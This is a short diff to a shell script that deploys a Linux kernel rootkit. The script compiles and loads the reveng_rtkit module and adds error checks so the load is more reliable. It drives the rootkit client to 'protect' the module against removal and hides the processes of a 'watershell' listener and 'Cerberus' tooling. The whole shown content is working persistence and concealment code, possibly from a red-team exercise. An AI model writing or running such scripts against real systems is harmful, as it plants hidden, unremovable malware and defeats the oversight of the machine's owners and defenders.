@@ -105,14 +105,28 @@ EOF
     # Compile and load the rootkit module
     cd reveng_rtkit/kernel_src
     make
-    sudo insmod reveng_rtkit.ko
+    if sudo insmod reveng_rtkit.ko; then
+        echo "Rootkit module loaded successfully."
+    else
+        echo "ERROR: Could not load reveng_rtkit.ko. Exiting."
+        exit 1
+    fi
+
+    # Verify the character device exists (usually /dev/reveng_rtkit)
+    if [ ! -e /dev/reveng_rtkit ]; then
+        echo "ERROR: Character device /dev/reveng_rtkit does not exist."
+        exit 1
+    fi
 
     # Compile the usermode client
     cd ../user_src
     gcc client_usermode.c -o client_usermode
 
-    # Set rootkit to protected mode to prevent removal
-    sudo ./client_usermode protect
+    # Set rootkit to protected mode and hide Cerberus processes
+    # Using a here-doc to automate client commands without manual input
+    sudo ./client_usermode <<EOF
+protect
+EOF
 
     # Hide all Cerberus and Watershell processes using their PIDs
     for pid in $(pgrep -f "watershell -l 10000 eth0"); do
